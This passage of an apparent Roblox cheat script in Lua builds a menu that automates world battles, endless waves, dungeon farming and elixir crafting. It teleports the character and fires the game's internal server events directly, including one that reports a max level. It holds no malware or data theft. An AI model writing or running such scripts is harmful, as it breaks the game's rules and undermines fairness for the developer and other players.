			Difficulty_choose.Text = ""Current Selection： 0"" .. gowordlevels;
		end
	elseif infBattle_ON then
		Difficulty_choose.Text = ""Current Selection： "" .. gowordlevels .. ""    Infinite Battle Wave Set： "" .. (infBattle * 100) .. "" Waves"";
	else
		Difficulty_choose.Text = ""Current Selection： "" .. gowordlevels;
	end
end
local Difficulty_selection = features2:AddDropdown(""                Difficulty Level Selection                "", function(text)
	if (text == ""  World ： 01 .. Easy"") then
		print(""World ： 01"");
		gowordlevels = 1;
		Difficulty_choose.Text = ""Current Selection： 01"";
	elseif (text == ""  World ： 21 .. Normal"") then
		print(""World ： 21"");
		gowordlevels = 21;
		gowordlevelscheak(gowordlevels);
	elseif (text == ""  World ： 41 .. Hard"") then
		print(""World ： 41"");
		gowordlevels = 41;
		gowordlevelscheak(gowordlevels);
	elseif (text == ""  World ： 61 .. Expert"") then
		print(""World ： 61"");
		gowordlevels = 61;
		gowordlevelscheak(gowordlevels);
	elseif (text == ""  World ： 81 .. Master"") then
		print(""World ： 81"");
		gowordlevels = 81;
		gowordlevelscheak(gowordlevels);
	elseif (text == ""  World ： 101"") then
		print(""World ： 101"");
		gowordlevels = 101;
		gowordlevelscheak(gowordlevels);
	elseif (text == ""  Auto Max Choose"") then
		local showone = false;
		print(""Current Selection: Auto Max Level"");
		if (worldnum < 10) then
			Difficulty_choose.Text = ""Current Selection Max Level: 0"" .. worldnum;
		else
			Difficulty_choose.Text = ""Current Selection Max Level: "" .. worldnum;
		end
		gowordlevels = worldnum;
		while true do
			local Difficulty_choose_Text = string.match(Difficulty_choose.Text, ""Current Selection Max Level"");
			if (Difficulty_choose_Text ~= ""Current Selection Max Level"") then
				showone = false;
				print(""Auto Max Level has stopped"");
				break;
			elseif not showone then
				print(""Auto Max Level has started"");
				showone = true;
			end
			if (newworldnum ~= worldnum) then
				gowordlevels = worldnum;
				newworldnum = worldnum;
				finishworldnum = tonumber(gowordlevels);
				if (worldnum < 10) then
					Difficulty_choose.Text = ""  Current Selection Max Level: 0"" .. gowordlevels;
				else
					Difficulty_choose.Text = ""  Current Selection Max Level: "" .. gowordlevels;
				end
				wait(savemodetime2);
				wait(savemodetime + 1);
				local args = {[1]=finishworldnum};
				game:GetService(""ReplicatedStorage""):FindFirstChild(""LevelData""):FindFirstChild(""MaxLevel""):FireServer(unpack(args));
			end
			wait(1);
		end
	end
end);
local Levels1 = Difficulty_selection:Add(""  World ： 01 .. Easy"");
local Levels2 = Difficulty_selection:Add(""  World ： 21 .. Normal"");
local Levels3 = Difficulty_selection:Add(""  World ： 41 .. Hard"");
local Levels4 = Difficulty_selection:Add(""  World ： 61 .. Expert"");
local Levels5 = Difficulty_selection:Add(""  World ： 81 .. Master"");
local Levels99 = Difficulty_selection:Add(""  Auto Max Choose"");
local Levels999 = Difficulty_selection:Add("" ... "");
features2:AddButton(""Select level +1"", function()
	gowordlevels = gowordlevels + 1;
	gowordlevelscheak(gowordlevels);
end);
features2:AddButton(""Select level -1"", function()
	gowordlevels = gowordlevels - 1;
	gowordlevelscheak(gowordlevels);
end);
local decimal = 0;
local function teleporttworld1()
	local args = {[1]=gowordlevels};
	game:GetService(""ReplicatedStorage""):FindFirstChild(""\228\186\139\228\187\182""):FindFirstChild(""\229\133\172\231\148\168""):FindFirstChild(""\229\133\179\229\141\161""):FindFirstChild(""\232\191\155\229\133\165\228\184\150\231\149\140\229\133\179\229\141\161""):FireServer(unpack(args));
	print(""傳送世界關卡："" .. gowordlevels);
end
local function teleporttworld2()
	finishworldnum = tonumber(gowordlevels);
	local args = {[1]=finishworldnum};
	game:GetService(""ReplicatedStorage""):FindFirstChild(""\228\186\139\228\187\182""):FindFirstChild(""\229\133\172\231\148\168""):FindFirstChild(""\229\133\179\229\141\161""):FindFirstChild(""\232\191\155\229\133\165\228\184\150\231\149\140\229\133\179\229\141\161""):FireServer(unpack(args));
	print(""重啟世界關卡："" .. finishworldnum);
end
local function CheckRestart()
	local combattext = playerGui.GUI:WaitForChild(""主界面""):WaitForChild(""战斗""):waitForChild(""关卡信息""):waitForChild(""文本"").Text;
	local worldstring = string.match(combattext, ""World"");
	finishworldnum = string.match(combattext, ""World (%d+)-"");
	local fraction = string.match(combattext, ""-(%d+/%d+)"");
	local combatfail = playerGui.GUI:WaitForChild(""主界面""):WaitForChild(""战斗""):waitForChild(""变强提示"").Visible;
	local combatimeout = playerGui.GUI:WaitForChild(""主界面""):WaitForChild(""战斗""):waitForChild(""战斗结果图片"").Visible;
	if ((combatfail or combatimeout) and Autostartwarld and worldstring) then
		print(""戰鬥失敗,重啟"");
		Restart = true;
	end
	if fraction then
		local numerator, denominator = string.match(fraction, ""(%d+)/(%d+)"");
		decimal = tonumber(numerator) / tonumber(denominator);
		if ((decimal == 1) and worldstring and Autostartwarld) then
			Restart = true;
		end
		if ((decimal >= infBattle) and worldstring and Autostar2twarld) then
			Restart = true;
		end
		if (Autostartwarld and Autostar2twarld) then
			showNotification(""Both modes turned on will only execute Endless Battle"");
		end
	end
end
local function teleporthome()
	wait(savemodetime2);
	player.Character:WaitForChild(""HumanoidRootPart"").CFrame = CFrame.new(TPX, TPY, TPZ);
end
features2:AddButton(""TP"", function()
	teleporttworld1();
end);
features2:AddLabel(""!! Auto start no longer requires wave restrictions"");
local Autostart = features2:AddSwitch(""Auto-start After Battle (World Battle)"", function(bool)
	Autostartwarld = bool;
	if Autostartwarld then
		while Autostartwarld do
			CheckRestart();
			if Restart then
				wait(savemodetime2);
				teleporthome();
				wait(0.5);
				wait(savemodetime);
				teleporttworld2();
				Restart = false;
			end
			wait(1);
		end
	end
end);
Autostart:Set(false);
local Autostart2 = features2:AddSwitch(""Endless Battle(Can Set)"", function(bool)
	Autostar2twarld = bool;
	if Autostar2twarld then
		infBattle_ON = true;
		gowordlevelscheak(gowordlevels);
		while Autostar2twarld do
			CheckRestart();
			if (Restart and not hasPrintedNoPlayer) then
				print(""Endless battle begins, no players nearby"");
				teleporttworld2();
				Restart = false;
			elseif (Restart and hasPrintedNoPlayer and (decimal == 1)) then
				print(""Endless battle begins, there are players nearby, execute normal mode"");
				wait(savemodetime2);
				teleporthome();
				wait(0.5);
				wait(savemodetime);
				teleporttworld2();
				Restart = false;
			end
			wait(1);
		end
	else
		infBattle_ON = false;
		gowordlevelscheak(gowordlevels);
	end
end);
features2:AddTextBox(""Endless Battle wave setting (Default 70 Waves)"", function(text)
	local num = tonumber(text);
	if (num and (num >= 0) and (num <= 100)) then
		infBattle = num * 0.01;
		print(""Endless Battle wave setting: "" .. text);
		gowordlevelscheak(gowordlevels);
	else
		showNotification(""Can only set a number between 0 and 100"");
		print(""Invalid input. Please enter a number between 0 and 100."");
	end
end);
Autostart2:Set(false);
features2:AddButton(""AFK Mode"", function()
	local AFKmod = game:GetService(""Players"").LocalPlayer:WaitForChild(""值""):WaitForChild(""设置""):WaitForChild(""自动战斗"");
	if (AFKmod.Value == true) then
		AFKmod.Value = false;
	else
		AFKmod.Value = true;
	end
end);
features2:AddButton(""Fast Dungeon Selection"", function()
	local event = game:GetService(""ReplicatedStorage""):FindFirstChild(""打开关卡选择"", true);
	if (event and event:IsA(""BindableEvent"")) then
		event:Fire(""打開煉丹爐"");
	end
end);
local httpService = game:GetService(""HttpService"");
local player = game.Players.LocalPlayer;
local filePath = ""DungeonsMaxLevel.json"";
local updDungeonui = false;
local AutoDungeonplus1 = false;
local Notexecuted = true;
local AutoDungeonplusonly = false;
local Autofinishdungeon = false;
local dungeonFunctions = {};
local function extractLocalPlayerData()
	if not isfile(filePath) then
		error(""JSON 文件不存在："" .. filePath);
	end
	local fileContent = readfile(filePath);
	local success, data = pcall(httpService.JSONDecode, httpService, fileContent);
	if not success then
		error(""無法解析 JSON 文件："" .. filePath);
	end
	local localPlayerName = player.Name;
	local localPlayerData = data[localPlayerName];
	if not localPlayerData then
		error(""LocalPlayer 的資料不存在於 JSON 文件中："" .. localPlayerName);
	end
	return localPlayerData;
end
local function saveDungeonFunctions(playerData)
	for dungeonName, maxLevel in pairs(playerData) do
		local functionName = dungeonName:gsub(""MaxLevel"", """");
		dungeonFunctions[functionName] = function()
			return maxLevel;
		end;
	end
end
local function updateDungeonFunctions()
	local playerData = JsonHandler.getPlayerData(filePath, player.Name);
	dungeonFunctions = {};
	saveDungeonFunctions(playerData);
end
local function main()
	local success, playerData = pcall(extractLocalPlayerData);
	if success then
		saveDungeonFunctions(playerData);
		print(""Dungeon 函數已成功創建"");
	else
		warn(""提取資料失敗："" .. tostring(playerData));
	end
end
main();
spawn(function()
	while true do
		if updDungeonui then
			local dungeonChoice = playerGui:WaitForChild(""GUI""):WaitForChild(""二级界面""):WaitForChild(""关卡选择""):WaitForChild(""副本选择弹出框""):WaitForChild(""背景""):WaitForChild(""标题""):WaitForChild(""名称"").Text;
			local dungeonMaxLevel = tonumber(playerGui:WaitForChild(""GUI""):WaitForChild(""二级界面""):WaitForChild(""关卡选择""):WaitForChild(""副本选择弹出框""):WaitForChild(""背景""):WaitForChild(""难度""):WaitForChild(""难度等级""):WaitForChild(""值"").Text);
			JsonHandler.updateDungeonMaxLevel(filePath, player.Name, dungeonChoice, dungeonMaxLevel);
			updateDungeonFunctions();
		end
		wait(1);
	end
end);
local playerData = JsonHandler.getPlayerData(filePath, player.Name);
print(""玩家初始資料:"");
for key, value in pairs(playerData) do
	print(key, value);
end
local Dungeonslist = playerGui:WaitForChild(""GUI""):WaitForChild(""二级界面""):WaitForChild(""关卡选择""):WaitForChild(""背景""):WaitForChild(""右侧界面""):WaitForChild(""副本""):WaitForChild(""列表"");
local dropdownchoose = 0;
local dropdownchoose2 = ""1"";
local dropdownchoose3 = 0;
local function getDungeonKey(dungeonName)
	local dungeon = Dungeonslist:FindFirstChild(dungeonName);
	if dungeon then
		local keyText = dungeon:WaitForChild(""钥匙""):WaitForChild(""值"").Text;
		local key = tonumber(string.match(keyText, ""^%d+""));
		if key then
			return ((key < 10) and string.format(""0%d"", key)) or tostring(key);
		end
	end
	return nil;
end
local Dungeonseventlist = playerGui:WaitForChild(""GUI""):WaitForChild(""二级界面""):WaitForChild(""关卡选择""):WaitForChild(""背景""):WaitForChild(""右侧界面""):WaitForChild(""活动副本""):WaitForChild(""列表"");
local EventDungeonkey;
local dungeonList = {""EasterDungeon"",""Halloween"",""ChristmasDungeon""};
local foundDungeons = {};
for _, dungeonName in ipairs(dungeonList) do
	local dungeon = Dungeonseventlist:FindFirstChild(dungeonName);
	if dungeon then
		local visible = dungeon.Visible;
		if visible then
			table.insert(foundDungeons, dungeonName);
		end
	end
end
local function getEventDungeonkey()
	if (#foundDungeons == 0) then
		EventDungeonkey = ""NOT OPEN"";
		return EventDungeonkey;
	else
		for _, dungeonName in ipairs(foundDungeons) do
			local dungeon = Dungeonseventlist:FindFirstChild(dungeonName);
			if dungeon then
				local keyObject = dungeon:FindFirstChild(""钥匙"");
				if keyObject then
					local keyValue = keyObject:FindFirstChild(""值"");
					if (keyValue and keyValue.Text) then
						local keyText = keyValue.Text;
						local key = tonumber(string.match(keyText, ""^%d+""));
						EventDungeonkey = key;
						return EventDungeonkey;
					end
				end
			end
		end
	end
end
local function checkDungeonkey()
	Ore_Dungeonkey = getDungeonKey(""OreDungeon"");
	Gem_Dungeonkey = getDungeonKey(""GemDungeon"");
	Gold_Dungeonkey = getDungeonKey(""GoldDungeon"");
	Relic_Dungeonkey = getDungeonKey(""RelicDungeon"");
	Rune_Dungeonkey = getDungeonKey(""RuneDungeon"");
	Hover_Dungeonkey = getDungeonKey(""HoverDungeon"");
	Event_Dungeonkey = getEventDungeonkey();
end
checkDungeonkey();
local chooselevels = features3:AddLabel(""Dungeon Selection ..."");
local dropdown1 = features3:AddDropdown(""Dungeon Selection ..."", function(text)
	if (text == ""    OreDungeon    "") then
		dropdownchoose = 1;
		dropdownchoose2 = tostring((dungeonFunctions['OreDungeon'] and dungeonFunctions['OreDungeon']()) or ""0"");
		chooselevels.Text = "" OreDungeon,  Key："" .. Ore_Dungeonkey .. ""  ,Level："" .. dropdownchoose2;
	elseif (text == ""    GemDungeon    "") then
		dropdownchoose = 2;
		dropdownchoose2 = tostring((dungeonFunctions['GemDungeon'] and dungeonFunctions['GemDungeon']()) or ""0"");
		chooselevels.Text = "" GemDungeon,  Key："" .. Gem_Dungeonkey .. ""  ,Level："" .. dropdownchoose2;
	elseif (text == ""    RuneDungeon    "") then
		dropdownchoose = 3;
		dropdownchoose2 = tostring((dungeonFunctions['RuneDungeon'] and dungeonFunctions['RuneDungeon']()) or ""0"");
		chooselevels.Text = "" RuneDungeon,  Key："" .. Rune_Dungeonkey .. ""  ,Level："" .. dropdownchoose2;
	elseif (text == ""    RelicDungeon    "") then
		dropdownchoose = 4;
		dropdownchoose2 = tostring((dungeonFunctions['RelicDungeon'] and dungeonFunctions['RelicDungeon']()) or ""0"");
		chooselevels.Text = "" RelicDungeon,  Key："" .. Relic_Dungeonkey .. ""  ,Level："" .. dropdownchoose2;
	elseif (text == ""    HoverDungeon    "") then
		dropdownchoose = 7;
		dropdownchoose2 = tostring((dungeonFunctions['HoverDungeon'] and dungeonFunctions['HoverDungeon']()) or ""0"");
		chooselevels.Text = "" HoverDungeon,  Key："" .. Hover_Dungeonkey .. ""  ,Level："" .. dropdownchoose2;
	elseif (text == ""    GoldDungeon    "") then
		dropdownchoose = 6;
		dropdownchoose2 = tostring((dungeonFunctions['GoldDungeon'] and dungeonFunctions['GoldDungeon']()) or ""0"");
		chooselevels.Text = "" GoldDungeon,  Key："" .. Gold_Dungeonkey .. ""  ,Level："" .. dropdownchoose2;
	elseif (text == ""    EventDungeon    "") then
		dropdownchoose = 9;
		dropdownchoose2 = ""1"";
		chooselevels.Text = "" EventDungeon,  Key："" .. Event_Dungeonkey;
	else
		dropdownchoose = 8;
		chooselevels.Text = ""    ...    "";
	end
end);
local Dungeon1 = dropdown1:Add(""    OreDungeon    "");
local Dungeon2 = dropdown1:Add(""    GemDungeon    "");
local Dungeon3 = dropdown1:Add(""    RuneDungeon    "");
local Dungeon4 = dropdown1:Add(""    RelicDungeon    "");
local Dungeon5 = dropdown1:Add(""    HoverDungeon    "");
local Dungeon6 = dropdown1:Add(""    GoldDungeon    "");
local Dungeon7 = dropdown1:Add(""    EventDungeon    "");
local Dungeon8 = dropdown1:Add(""    ...    "");
local function UDPDungeontext()
	if (dropdownchoose == 0) then
		chooselevels.Text = ""Dungeon Selection ..."";
	elseif (dropdownchoose == 1) then
		dropdownchoose2 = tostring((dungeonFunctions['OreDungeon'] and dungeonFunctions['OreDungeon']()) or ""0"");
		chooselevels.Text = "" OreDungeon,  Key："" .. Ore_Dungeonkey .. ""  ,Level："" .. dropdownchoose2;
	elseif (dropdownchoose == 2) then
		dropdownchoose2 = tostring((dungeonFunctions['GemDungeon'] and dungeonFunctions['GemDungeon']()) or ""0"");
		chooselevels.Text = "" GemDungeon,  Key："" .. Gem_Dungeonkey .. ""  ,Level："" .. dropdownchoose2;
	elseif (dropdownchoose == 3) then
		dropdownchoose2 = tostring((dungeonFunctions['RuneDungeon'] and dungeonFunctions['RuneDungeon']()) or ""0"");
		chooselevels.Text = "" RuneDungeon,  Key："" .. Rune_Dungeonkey .. ""  ,Level："" .. dropdownchoose2;
	elseif (dropdownchoose == 4) then
		dropdownchoose2 = tostring((dungeonFunctions['RelicDungeon'] and dungeonFunctions['RelicDungeon']()) or ""0"");
		chooselevels.Text = "" RelicDungeon,  Key："" .. Relic_Dungeonkey .. ""  ,Level："" .. dropdownchoose2;
	elseif (dropdownchoose == 7) then
		dropdownchoose2 = tostring((dungeonFunctions['HoverDungeon'] and dungeonFunctions['HoverDungeon']()) or ""0"");
		chooselevels.Text = "" HoverDungeon,  Key："" .. Hover_Dungeonkey .. ""  ,Level："" .. dropdownchoose2;
	elseif (dropdownchoose == 6) then
		dropdownchoose2 = tostring((dungeonFunctions['GoldDungeon'] and dungeonFunctions['GoldDungeon']()) or ""0"");
		chooselevels.Text = "" GoldDungeon,  Key："" .. Gold_Dungeonkey .. ""  ,Level："" .. dropdownchoose2;
	elseif (dropdownchoose == 9) then
		chooselevels.Text = "" EventDungeon,  Key："" .. Event_Dungeonkey;
	elseif (dropdownchoose == 8) then
		chooselevels.Text = ""    ...    "";
	end
end
local function UDPDungeonchoose()
	checkDungeonkey();
	Dungeon1.Text = ""      OreDungeon             Key："" .. Ore_Dungeonkey .. ""  "";
	Dungeon2.Text = ""      GemDungeon          Key："" .. Gem_Dungeonkey .. ""  "";
	Dungeon3.Text = ""      RuneDungeon         Key："" .. Rune_Dungeonkey .. ""  "";
	Dungeon4.Text = ""      RelicDungeon          Key："" .. Relic_Dungeonkey .. ""  "";
	Dungeon5.Text = ""      HoverDungeon        Key："" .. Hover_Dungeonkey .. ""  "";
	Dungeon6.Text = ""      GoldDungeon           Key："" .. Gold_Dungeonkey .. ""  "";
	Dungeon7.Text = ""      EventDungeon         Key："" .. Event_Dungeonkey .. ""  "";
end
spawn(function()
	while true do
		UDPDungeonchoose();
		UDPDungeontext();
		wait(0.5);
	end
end);
local updDungeonuiSwitch = features3:AddSwitch(""Sync dungeon entry interface difficulty"", function(bool)
	updDungeonui = bool;
end);
updDungeonuiSwitch:Set(false);
local function updateDungeonLevel(dungeonName, dataField, newLevel)
	JsonHandler.updatePlayerData(filePath, player.Name, {[dataField]=newLevel});
	updateDungeonFunctions();
	print(""更新後的 "" .. dungeonName .. "" 等級:"", dungeonFunctions[dungeonName]());
end
local function adjustDungeonLevel(adjustment)
	local newLevel = dropdownchoose2 + adjustment;
	local dungeonMapping = {[1]={name=""OreDungeon"",field=""OreDungeonMaxLevel""},[2]={name=""GemDungeon"",field=""GemDungeonMaxLevel""},[3]={name=""RuneDungeon"",field=""RuneDungeonMaxLevel""},[4]={name=""RelicDungeon"",field=""RelicDungeonMaxLevel""},[7]={name=""HoverDungeon"",field=""HoverDungeonMaxLevel""},[6]={name=""GoldDungeon"",field=""GoldDungeonMaxLevel""}};
	local dungeon = dungeonMapping[dropdownchoose];
	if dungeon then
		updateDungeonLevel(dungeon.name, dungeon.field, newLevel);
	else
		print(""未選擇地下城"");
	end
end
local function DungeonTP()
	local dropdownTP = tonumber(dropdownchoose2);
	local args = {[1]=dropdownchoose,[2]=dropdownTP};
	game:GetService(""ReplicatedStorage""):FindFirstChild(""\228\186\139\228\187\182""):FindFirstChild(""\229\133\172\231\148\168""):FindFirstChild(""\229\137\175\230\156\172""):FindFirstChild(""\232\191\155\229\133\165\229\137\175\230\156\172""):FireServer(unpack(args));
end
local dungeonList = {""Ore Dungeon"",""Gem Dungeon"",""Rune Dungeon"",""Relic Dungeon"",""Hover Dungeon"",""Gold Dungeon""};
local dungeonKeys = {[""Ore Dungeon""]=""OreDungeon"",[""Gem Dungeon""]=""GemDungeon"",[""Rune Dungeon""]=""RuneDungeon"",[""Relic Dungeon""]=""RelicDungeon"",[""Hover Dungeon""]=""HoverDungeon"",[""Gold Dungeon""]=""GoldDungeon""};
local changeDungeon = false;
local function getDungeonWithMostKeys()
	changeDungeon = true;
	local maxKeys = 0;
	local bestDungeon = nil;
	local bestDropdownIndex = 1;
	local dropdownMapping = {1,2,3,4,7,6};
	for i, name in ipairs(dungeonList) do
		local keyCount = tonumber(getDungeonKey(dungeonKeys[name])) or 0;
		if (keyCount > maxKeys) then
			maxKeys = keyCount;
			bestDungeon = name;
			bestDropdownIndex = dropdownMapping[i] or 0;
		end
	end
	return bestDungeon, bestDropdownIndex;
end
local function selectDungeonWithMostKeys()
	local bestDungeon, bestDropdownIndex = getDungeonWithMostKeys();
	dropdownchoose = bestDropdownIndex;
	local dungeonName = bestDungeon;
	local dungeonLevel = tostring(dungeonFunctions[dungeonKeys[dungeonName]]() or ""0"");
	print(""已選擇最多鑰匙的地下城："" .. dungeonName);
	showNotification(""ChangeDungeon:"" .. dungeonName);
	wait(0.5);
	wait(savemodetime2);
	DungeonTP();
end
local function AutostartDungeonf()
	local Dungeonuilevel = playerGui.GUI:WaitForChild(""主界面""):WaitForChild(""战斗""):WaitForChild(""关卡信息""):WaitForChild(""文本"").Text;
	local dungeonNametext = string.match(Dungeonuilevel, ""^(.-)%s%d"");
	if (dungeonNametext == ""Ore Dungeon"") then
		local lastKeysCount = getDungeonKey(""OreDungeon"");
		local lastKeysCount1 = tonumber(lastKeysCount);
		local currentKeysCount = tonumber(string.match(Dungeonuilevel, ""Keys:%s*(%d+)""));
		if ((lastKeysCount1 ~= currentKeysCount) and (lastKeysCount1 > 0)) then
			if (AutoDungeonplus1 and not changeDungeon) then
				adjustDungeonLevel(1);
			end
			changeDungeon = false;
			wait(savemodetime2);
			teleporthome();
			wait(0.5);
			wait(savemodetime);
			DungeonTP();
		elseif ((lastKeysCount1 == 0) and Autofinishdungeon) then
			if (lastKeysCount1 ~= currentKeysCount) then
				if (AutoDungeonplus1 and not AutoDungeonplusonly) then
					adjustDungeonLevel(1);
					AutoDungeonplusonly = true;
					wait(3);
					AutoDungeonplusonly = false;
				end
			end
			print(""已啟用自動完成地下城"");
			selectDungeonWithMostKeys();
		end
	elseif (dungeonNametext == ""Gem Dungeon"") then
		local lastKeysCount = getDungeonKey(""GemDungeon"");
		local lastKeysCount1 = tonumber(lastKeysCount);
		local currentKeysCount = tonumber(string.match(Dungeonuilevel, ""Keys:%s*(%d+)""));
		if ((lastKeysCount1 ~= currentKeysCount) and (lastKeysCount1 > 0)) then
			if (AutoDungeonplus1 and not changeDungeon) then
				adjustDungeonLevel(1);
			end
			changeDungeon = false;
			wait(savemodetime2);
			teleporthome();
			wait(0.5);
			wait(savemodetime);
			DungeonTP();
		elseif ((lastKeysCount1 == 0) and Autofinishdungeon) then
			if (lastKeysCount1 ~= currentKeysCount) then
				if (AutoDungeonplus1 and not AutoDungeonplusonly) then
					adjustDungeonLevel(1);
					AutoDungeonplusonly = true;
					wait(3);
					AutoDungeonplusonly = false;
				end
			end
			print(""已啟用自動完成地下城"");
			selectDungeonWithMostKeys();
		end
	elseif (dungeonNametext == ""Rune Dungeon"") then
		local lastKeysCount = getDungeonKey(""RuneDungeon"");
		local lastKeysCount1 = tonumber(lastKeysCount);
		local currentKeysCount = tonumber(string.match(Dungeonuilevel, ""Keys:%s*(%d+)""));
		if ((lastKeysCount1 ~= currentKeysCount) and (lastKeysCount1 > 0)) then
			if (AutoDungeonplus1 and not changeDungeon) then
				adjustDungeonLevel(1);
			end
			changeDungeon = false;
			wait(savemodetime2);
			teleporthome();
			wait(0.5);
			wait(savemodetime);
			DungeonTP();
		elseif ((lastKeysCount1 == 0) and Autofinishdungeon) then
			if (lastKeysCount1 ~= currentKeysCount) then
				if (AutoDungeonplus1 and not AutoDungeonplusonly) then
					adjustDungeonLevel(1);
					AutoDungeonplusonly = true;
					wait(3);
					AutoDungeonplusonly = false;
				end
			end
			print(""已啟用自動完成地下城"");
			selectDungeonWithMostKeys();
		end
	elseif (dungeonNametext == ""Relic Dungeon"") then
		local lastKeysCount = getDungeonKey(""RelicDungeon"");
		local lastKeysCount1 = tonumber(lastKeysCount);
		local currentKeysCount = tonumber(string.match(Dungeonuilevel, ""Keys:%s*(%d+)""));
		if ((lastKeysCount1 ~= currentKeysCount) and (lastKeysCount1 > 0)) then
			if (AutoDungeonplus1 and not changeDungeon) then
				adjustDungeonLevel(1);
			end
			changeDungeon = false;
			wait(savemodetime2);
			teleporthome();
			wait(0.5);
			wait(savemodetime);
			DungeonTP();
		elseif ((lastKeysCount1 == 0) and Autofinishdungeon) then
			if (lastKeysCount1 ~= currentKeysCount) then
				if (AutoDungeonplus1 and not AutoDungeonplusonly) then
					adjustDungeonLevel(1);
					AutoDungeonplusonly = true;
					wait(3);
					AutoDungeonplusonly = false;
				end
			end
			print(""已啟用自動完成地下城"");
			selectDungeonWithMostKeys();
		end
	elseif (dungeonNametext == ""Hover Dungeon"") then
		local lastKeysCount = getDungeonKey(""HoverDungeon"");
		local lastKeysCount1 = tonumber(lastKeysCount);
		local currentKeysCount = tonumber(string.match(Dungeonuilevel, ""Keys:%s*(%d+)""));
		if ((lastKeysCount1 ~= currentKeysCount) and (lastKeysCount1 > 0)) then
			if (AutoDungeonplus1 and not changeDungeon) then
				adjustDungeonLevel(1);
			end
			changeDungeon = false;
			wait(savemodetime2);
			teleporthome();
			wait(0.5);
			wait(savemodetime);
			DungeonTP();
		elseif ((lastKeysCount1 == 0) and Autofinishdungeon) then
			if (lastKeysCount1 ~= currentKeysCount) then
				if (AutoDungeonplus1 and not AutoDungeonplusonly) then
					adjustDungeonLevel(1);
					AutoDungeonplusonly = true;
					wait(3);
					AutoDungeonplusonly = false;
				end
			end
			print(""已啟用自動完成地下城"");
			selectDungeonWithMostKeys();
		end
	elseif (dungeonNametext == ""Gold Dungeon"") then
		local lastKeysCount = getDungeonKey(""GoldDungeon"");
		local lastKeysCount1 = tonumber(lastKeysCount);
		local currentKeysCount = tonumber(string.match(Dungeonuilevel, ""Keys:%s*(%d+)""));
		if ((lastKeysCount1 ~= currentKeysCount) and (lastKeysCount1 > 0)) then
			if (AutoDungeonplus1 and not changeDungeon) then
				adjustDungeonLevel(1);
			end
			changeDungeon = false;
			wait(savemodetime2);
			teleporthome();
			wait(0.5);
			wait(savemodetime);
			DungeonTP();
		elseif ((lastKeysCount1 == 0) and Autofinishdungeon) then
			if (lastKeysCount1 ~= currentKeysCount) then
				if (AutoDungeonplus1 and not AutoDungeonplusonly) then
					adjustDungeonLevel(1);
					AutoDungeonplusonly = true;
					wait(3);
					AutoDungeonplusonly = false;
				end
			end
			print(""已啟用自動完成地下城"");
			selectDungeonWithMostKeys();
		end
	end
end
local AutostartDungeonSwitch = features3:AddSwitch(""Auto-start After Battle (Dungeon) -- Victory Required"", function(bool)
	AutostartDungeon = bool;
	if AutostartDungeon then
		while AutostartDungeon do
			AutostartDungeonf();
			wait(0.5);
		end
	end
end);
AutostartDungeonSwitch:Set(false);
local AutoDungeonplus1Switch = features3:AddSwitch(""Automatically Increase Level by +1 After Battle"", function(bool)
	AutoDungeonplus1 = bool;
end);
AutoDungeonplus1Switch:Set(false);
features3:AddLabel(""If open ,When no keys, it will change to other dungeon"");
local AutofinishdungeonSwitch = features3:AddSwitch(""Complete All Dungeons "", function(bool)
	Autofinishdungeon = bool;
end);
AutofinishdungeonSwitch:Set(false);
features3:AddTextBox(""You can also manually input the level"", function(text)
	local dropdownchoose0 = string.gsub(text, ""[^%d]"", """");
	local dropdownchoose3 = tonumber(dropdownchoose0);
	if not dropdownchoose3 then
		dropdownchoose3 = 1;
	end
	if (dropdownchoose == 1) then
		local field = ""OreDungeonMaxLevel"";
		JsonHandler.updateField(filePath, player.Name, field, dropdownchoose3);
		updateDungeonFunctions();
	elseif (dropdownchoose == 2) then
		local field = ""GemDungeonMaxLevel"";
		JsonHandler.updateField(filePath, player.Name, field, dropdownchoose3);
		updateDungeonFunctions();
	elseif (dropdownchoose == 3) then
		local field = ""RuneDungeonMaxLevel"";
		JsonHandler.updateField(filePath, player.Name, field, dropdownchoose3);
		updateDungeonFunctions();
	elseif (dropdownchoose == 4) then
		local field = ""RelicDungeonMaxLevel"";
		JsonHandler.updateField(filePath, player.Name, field, dropdownchoose3);
		updateDungeonFunctions();
	elseif (dropdownchoose == 5) then
		local field = ""HoverDungeonMaxLevel"";
		JsonHandler.updateField(filePath, player.Name, field, dropdownchoose3);
		updateDungeonFunctions();
	elseif (dropdownchoose == 6) then
		local field = ""GoldDungeonMaxLevel"";
		JsonHandler.updateField(filePath, player.Name, field, dropdownchoose3);
		updateDungeonFunctions();
	else
		print(""未選擇地下城"");
	end
end);
features3:AddButton(""Level Selection +1"", function()
	adjustDungeonLevel(1);
end);
features3:AddButton(""Level Selection -1"", function()
	adjustDungeonLevel(-1);
end);
features3:AddButton(""TP"", function()
	if ((Event_Dungeonkey == ""NOT OPEN"") and (dropdownchoose == 9)) then
		print(""Event Dungeon Not Open"");
		return;
	else
		DungeonTP();
	end
end);
local AutoelixirSwitch = features4:AddSwitch(""Auto Elixir "", function(bool)
	Autoelixir = bool;
	if Autoelixir then
		while Autoelixir do
			local elixirspand = playerGui.GUI:WaitForChild(""二级界面""):WaitForChild(""炼丹炉""):WaitForChild(""背景""):WaitForChild(""形象""):WaitForChild(""制作""):WaitForChild(""按钮""):WaitForChild(""数量区""):WaitForChild(""价格"").text;
			elixirspand = tonumber(elixirspand);
			local elixirnum = player:WaitForChild(""值""):WaitForChild(""货币""):WaitForChild(""草药"").Value;
			if (elixirnum >= elixirspand) then
				game:GetService(""ReplicatedStorage""):FindFirstChild(""\228\186\139\228\187\182""):FindFirstChild(""\229\133\172\231\148\168""):FindFirstChild(""\231\130\188\228\184\185""):FindFirstChild(""\229\136\182\228\189\156""):FireServer();
			else
				print(""草药不足"");
			end
			wait(1);
		end
	end
end);
AutoelixirSwitch:Set(false);
local AutoelixirabsorbSwitch = features4:AddSwitch(""Auto Absorb Elixir⚠️All Elixir in the backpack⚠️）"", function(bool)
	Autoelixirabsorb = bool;
	if Autoelixirabsorb then
		while Autoelixirabsorb do
			local pllayerbag = playerGui.GUI:WaitForChild(""二级界面""):waitForChild(""主角""):WaitForChild(""背景""):waitForChild(""右侧界面""):WaitForChild(""丹药""):waitForChild(""背包区域""):WaitForChild(""积分""):waitForChild(""文本"").text;
			if (pllayerbag ~= ""0"") then
				game:GetService(""ReplicatedStorage""):FindFirstChild(""\228\186\139\228\187\182""):FindFirstChild(""\229\133\172\231\148\168""):FindFirstChild(""\228\184\185\232\141\175""):FindFirstChild(""\229\144\184\230\148\182\229\133\168\233\131\168""):FireServer();
			end
			wait(1.5);
		end
	end
end);
AutoelixirabsorbSwitch:Set(false);
local player = game:GetService(""Players"").LocalPlayer;
